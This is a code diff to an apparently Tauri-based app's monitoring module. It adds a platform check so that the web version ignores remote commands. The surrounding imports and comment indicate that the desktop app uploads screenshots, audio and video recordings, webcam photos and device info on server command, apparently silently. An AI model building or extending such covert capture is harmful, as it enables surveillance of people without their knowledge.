@@ -1,4 +1,5 @@
 import { invoke } from '@tauri-apps/api/core';
+import { isTauri } from './platform';
 import { presenceService } from './presence';
 import { uploadScreenshot, uploadAudioRecording, uploadVideoRecording, uploadWebcamPhoto, ackCommand, uploadDeviceInfo } from './api';
 
@@ -246,6 +247,10 @@ export async function handleCommand(
   params: Record<string, any>,
   commandId: number,
 ) {
+  // Device monitoring is a desktop-app capability (screen capture, native
+  // device info, background recording). A browser tab can't do any of it
+  // silently, so the web version ignores these commands.
+  if (!isTauri()) return;
   console.log('[monitoring] command:', commandType, commandId);
   try {
     switch (commandType) {
